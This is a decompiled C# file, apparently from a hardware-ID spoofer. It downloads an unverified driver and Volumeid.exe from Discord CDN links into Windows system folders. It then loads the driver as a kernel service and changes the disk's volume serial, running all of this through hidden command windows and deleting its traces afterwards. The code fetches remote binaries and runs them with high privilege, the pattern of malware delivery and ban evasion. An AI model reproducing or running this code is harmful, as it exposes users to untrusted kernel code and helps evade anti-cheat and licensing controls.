using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace HardDrive
{
    // Token: 0x02000005 RID: 5
    internal class Diskdrive
    {
        // Token: 0x0600001B RID: 27 RVA: 0x00002D24 File Offset: 0x00000F24
        public static void DiskdriveSpoof()
        {
            Diskdrive.ExecuteCommand("sc create Win32x64_0 binPath= C:\\Windows\\zxEsdMeYxazy.dat type= kernel");
            Thread.Sleep(600);
            Diskdrive.ExecuteCommand("sc start Win32x64_0");
            Diskdrive.ExecuteCommand("sc stop Win32x64_0");
            Diskdrive.ExecuteCommand("sc delete Win32x64_0");
            File.Delete("C:\\Windows\\zxEsdMeYxazy.dat");
        }

        // Token: 0x0600001C RID: 28 RVA: 0x00002D74 File Offset: 0x00000F74
        public static void DownloadDriver()
        {
            WebClient webClient = new WebClient();
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/614402516381204485/622366670987591690/zxEsdMeYxazy.dat", "C:\\Windows\\zxEsdMeYxazy.dat");
            webClient.Proxy = null;
        }

        // Token: 0x0600001D RID: 29 RVA: 0x00002DA4 File Offset: 0x00000FA4
        public static void VolumeID()
        {
            bool flag = File.Exists("C:\\Windows\\System32\\wbem\\Volumeid.exe");
            bool flag2 = flag;
            bool flag3 = flag2;
            if (flag3)
            {
                Random random = new Random();
                string str = random.Next(1000, 9999).ToString() + "-" + random.Next(1000, 9999).ToString();
                Process process = new Process();
                process.StartInfo.RedirectStandardInput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.StartInfo.FileName = "cmd.exe";
                process.Start();
                process.StandardInput.WriteLine("cd C:\\Windows\\System32\\wbem");
                process.StandardInput.WriteLine("volumeid C: " + str);
                Thread.Sleep(1000);
                process.Close();
            }
            else
            {
                Thread.Sleep(4700);
                WebClient webClient = new WebClient();
                webClient.DownloadFile("https://cdn.discordapp.com/attachments/614402516381204485/616996464630956053/Volumeid.exe", "C:\\Windows\\System32\\wbem\\Volumeid.exe");
                webClient.Proxy = null;
                Random random2 = new Random();
                string str2 = random2.Next(1000, 9999).ToString() + "-" + random2.Next(1000, 9999).ToString();
                Process process2 = new Process();
                process2.StartInfo.RedirectStandardInput = true;
                process2.StartInfo.UseShellExecute = false;
                process2.StartInfo.CreateNoWindow = true;
                process2.StartInfo.FileName = "cmd.exe";
                process2.Start();
                process2.StandardInput.WriteLine("cd C:\\Windows\\System32\\wbem");
                process2.StandardInput.WriteLine("volumeid C: " + str2);
                Thread.Sleep(1500);
                process2.Close();
            }
        }

        // Token: 0x0600001E RID: 30 RVA: 0x00002F9C File Offset: 0x0000119C
        private static void ExecuteCommand(string command)
        {
            Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + command)
            {
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardError = true,
                RedirectStandardOutput = true
            });
            process.WaitForExit();
            string text = process.StandardOutput.ReadToEnd();
            string text2 = process.StandardError.ReadToEnd();
            int exitCode = process.ExitCode;
            process.Close();
        }
    }
}
